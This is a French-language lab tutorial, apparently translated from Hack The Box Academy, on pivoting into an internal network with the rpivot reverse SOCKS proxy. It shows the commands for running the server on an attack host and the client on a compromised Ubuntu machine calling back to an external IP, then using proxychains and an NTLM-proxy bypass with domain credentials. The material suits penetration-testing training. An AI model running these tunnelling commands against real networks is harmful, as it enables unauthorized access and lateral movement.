Pivotement de serveur Web avec Rpivot
===============================

* * * * *

[Rpivot](https://github.com/klsecservices/rpivot) est un outil de proxy inverse SOCKS écrit en Python pour le tunneling SOCKS. Rpivot lie une machine à l'intérieur d'un réseau d'entreprise à un serveur externe et expose le port local du client côté serveur. Nous prendrons le scénario ci-dessous, où nous avons un serveur Web sur notre réseau interne (`172.16.5.135`), et nous voulons y accéder en utilisant le proxy rpivot.

![](https://academy.hackthebox.com/storage/modules/158/77.png)

Nous pouvons démarrer notre serveur proxy rpivot SOCKS en utilisant la commande ci-dessous pour permettre au client de se connecter sur le port 9999 et d'écouter sur le port 9050 les connexions pivot proxy.

#### Clonage du pivot

Clonage du pivot

```
dsgsec@htb[/htb]$ sudo git clone https://github.com/klsecservices/rpivot.git

```

#### Installation de Python2.7

Installation de Python2.7

```
dsgsec@htb[/htb]$ sudo apt-get install python2.7

```

Nous pouvons démarrer notre serveur proxy rpivot SOCKS pour nous connecter à notre client sur le serveur Ubuntu compromis en utilisant `server.py`.

#### Exécution de server.py à partir de l'hôte d'attaque

Exécution de server.py à partir de l'hôte d'attaque

```
dsgsec@htb[/htb]$ python2.7 serveur.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0

```

Avant d'exécuter `client.py` nous devrons transférer rpivot vers la cible. Nous pouvons le faire en utilisant cette commande SCP :

#### Transfert de rpivot vers la cible

Transfert de rpivot vers la cible

```
dsgsec@htb[/htb]$ scp -r rpivot ubuntu@<IpaddressOfTarget>:/home/ubuntu/

```

#### Exécution de client.py à partir de la cible pivot

Exécution de client.py à partir de la cible pivot

```
ubuntu@WEB01 :~/rpivot$ python2.7 client.py --server-ip 10.10.14.18 --server-port 9999

Reconnexion au serveur 10.10.14.18 port 9999

```

#### Confirmation que la connexion est établie

Confirmation que la connexion est établie

```
Nouvelle connexion depuis l'hôte 10.129.202.64, port source 35226

```

Nous allons configurer les proxychains pour pivoter sur notre serveur local sur 127.0.0.1:9050 sur notre hôte d'attaque, qui a été initialement lancé par le serveur Python.

Enfin, nous devrions pouvoir accéder au serveur Web côté serveur, qui est hébergé sur le réseau interne de 172.16.5.0/23 à 172.16.5.135:80 en utilisant proxychains et Firefox.

#### Navigation vers le serveur Web cible à l'aide de Proxychains

Navigation vers le serveur Web cible à l'aide de Proxychains

```
proxychains firefox-esr 172.16.5.135:80

```

![(https://academy.hackthebox.com/storage/modules/158/rpivot_proxychain.png)

Semblable au proxy pivot ci-dessus, il peut y avoir des scénarios dans lesquels nous ne pouvons pas pivoter directement vers un serveur externe (hôte d'attaque) sur le cloud. Certaines organisations ont [proxy HTTP avec authentification NTLM](https://docs.microsoft.com/en-us/openspecs/office_protocols/ms-grvhenc/b9e676e7-e787-4020-9840-7cfe7c76044a) configuré avec le contrôleur de domaine. Dans de tels cas, nous pouvons fournir une option d'authentification NTLM supplémentaire pour rpivot pour s'authentifier via le proxy NTLM en fournissant un nom d'utilisateur et un mot de passe. Dans ces cas, nous pourrions utiliser client.py de rpivot de la manière suivante :

#### Connexion à un serveur Web à l'aide du proxy HTTP et de l'authentification NTLM

Connexion à un serveur Web à l'aide du proxy HTTP et de l'authentification NTLM

```
python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> -- mot de passe <mot de passe>

```